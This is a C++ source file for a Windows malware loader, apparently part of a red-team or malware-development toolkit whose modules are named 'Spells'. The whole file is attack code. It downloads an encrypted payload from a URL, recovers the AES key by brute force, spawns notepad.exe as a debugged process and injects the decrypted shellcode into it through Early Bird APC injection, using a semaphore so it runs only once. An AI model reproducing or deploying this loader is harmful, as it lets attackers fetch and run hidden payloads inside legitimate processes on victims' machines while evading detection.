
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"



#include "../../Spells/EncryptionSpells/AESEnc.h"
#include "../../Spells/EncryptionSpells/KeyBrute.h"


#include "../../Spells/CreationSpells/CreateDebugged.h"


#include "../../Spells/RemoteExecutionSpells/EarlyBirdApcInjection.h"


using namespace std;
int main()
{
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
    string Url = "http://localhost:8000/payload.bin";
    LPWSTR szProcessName = L"notepad.exe";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    

    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    

    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, (PDWORD)&pPayloadSize)){
        printf("Failed to fetch payload");
        return 0;
    }

    

    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){
        printf("Failed to find remote process");
        return 0;
    }

    unsigned char ProtectedKey[] = {
	0xD3, 0x9E, 0xC1, 0x98, 0xDA, 0x07, 0xFB, 0xD9, 0x59, 0x4A, 0xAD, 0x33, 0x55, 0xFD, 0xF8, 0xC1, 
	0xAC, 0xC6, 0xE9, 0x06, 0x37, 0x85, 0x75, 0x54, 0xA3, 0x9C, 0xB1, 0x0E, 0xC3, 0x5F, 0x8F, 0x0E };
    
    #define HINT_BYTE 0x20
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);



    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){
        printf("Failed to execute payload");
        return 0;
    }
            
    free(pPayloadAddress);
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}
